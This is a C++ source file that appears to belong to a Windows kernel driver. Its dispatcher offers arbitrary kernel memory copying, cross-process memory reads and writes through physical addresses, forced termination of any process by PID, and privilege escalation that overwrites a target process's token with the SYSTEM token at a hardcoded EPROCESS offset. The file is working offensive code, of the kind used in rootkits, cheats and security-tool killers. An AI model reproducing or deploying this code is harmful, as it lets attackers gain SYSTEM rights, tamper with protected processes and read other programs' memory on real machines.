#include "dispatcher.h"

uint64_t dispatcher::Start(command_t cmd)
{
	switch (cmd.type)
	{
	case ::CopyKernelMemory:
		return CopyKernelMemory(cmd.data);
	case ::ReadProcessMemory:
		return ReadProcessMemory(cmd.data);
	case ::WriteProcessMemory:
		return WriteProcessMemory(cmd.data);
	case ::KillProcess:
		return KillProcess(cmd.data);
	case ::PrivilegeEscalation:
		return PrivilegeEscalation(cmd.data);
	}
}

uint64_t dispatcher::CopyKernelMemory(uint64_t data[10])
{
	uint64_t source      = data[0];
	uint64_t destination = data[1];
	uint64_t size        = data[2];

	memory::copy((uint64_t*)source, (uint64_t*)destination, size);

	return 0;
}

uint64_t dispatcher::ReadProcessMemory(uint64_t data[10])
{
	uint64_t source		 = data[0];
	uint64_t destination = data[1];
	uint64_t size        = data[2];
	uint64_t pid	     = data[3];

	uint64_t phys_addr   = va_to_pa(source, pid);
	uint64_t result      = ReadPhysicalMemory(phys_addr, (uint64_t*)destination, size);

	return result;
}

uint64_t dispatcher::WriteProcessMemory(uint64_t data[10])
{
	uint64_t source      = data[0];
	uint64_t destination = data[1];
	uint64_t size        = data[2];
	uint64_t pid         = data[3];

	uint64_t phys_addr   = va_to_pa(source, pid);
	uint64_t result      = WritePhysicalMemory(phys_addr, (uint64_t*)destination, size);

	return 0;
}

uint64_t dispatcher::KillProcess(uint64_t data[10])
{
	uint64_t pid = data[0];

	uint64_t PsLookupProcessByProcessId = memory::get_export_address(global::ntoskrnl, "PsLookupProcessByProcessId");

	uint64_t target_peprocess = 0;
	((uint64_t(*)(uint64_t, uint64_t*))PsLookupProcessByProcessId)(pid, &target_peprocess);

	uint64_t ZwOpenProcess = memory::get_export_address(global::ntoskrnl, "ZwOpenProcess");
	uint64_t ZwClose = memory::get_export_address(global::ntoskrnl, "ZwClose");
	uint64_t ZwTerminateProcess = memory::get_export_address(global::ntoskrnl, "ZwTerminateProcess");

	uint64_t client_id[2] = { pid, 0 };
	uint64_t object_attributes[6] = { sizeof(object_attributes), 0, 0, 0, 0, 0 };

	uint64_t handle = 0;
	uint64_t status = ((uint64_t(*)(uint64_t*, uint32_t, uint64_t*, uint64_t*))ZwOpenProcess)(&handle, 1, (uint64_t*) &object_attributes, (uint64_t*) &client_id);
	if (status != 0) 
	{
		Log("Can't open target process!");
		return 1;
	}

	status = ((uint64_t(*)(uint64_t, uint64_t))ZwTerminateProcess)(handle, 0);
	if (status != 0)
	{
		Log("Can't termianate process!");
		return 1;
	}

	status = ((uint64_t(*)(uint64_t))ZwClose)(handle);
	if (status != 0)
	{
		Log("Can't close process!");
		return 1;
	}

	return 0;
}

uint64_t dispatcher::PrivilegeEscalation(uint64_t data[10])
{
	uint64_t pid = data[0];
	Log("pid -> %p", pid);

	uint64_t PsLookupProcessByProcessId = memory::get_export_address(global::ntoskrnl, "PsLookupProcessByProcessId");

	uint64_t target_peprocess = 0;
	uint64_t system_peprocess = 0;

	((uint64_t(*)(uint64_t, uint64_t*))PsLookupProcessByProcessId)(pid, &target_peprocess);
	((uint64_t(*)(uint64_t, uint64_t*))PsLookupProcessByProcessId)(4,   &system_peprocess);

	uint64_t system_token = 0;
	/* getting system token from ntoskrnl.exe */
	memory::copy((uint64_t*)((uint8_t*)system_peprocess + 0x4b8 /* ->Token */), &system_token, sizeof(uint64_t) /* sizeof(_EX_FAST_REF) */);
	Log("system_token  -> %p", system_token);
	memory::copy(&system_token, (uint64_t*)((uint8_t*)target_peprocess + 0x4b8 /* ->Token */), sizeof(uint64_t) /* sizeof(_EX_FAST_REF) */);

	return 0;
}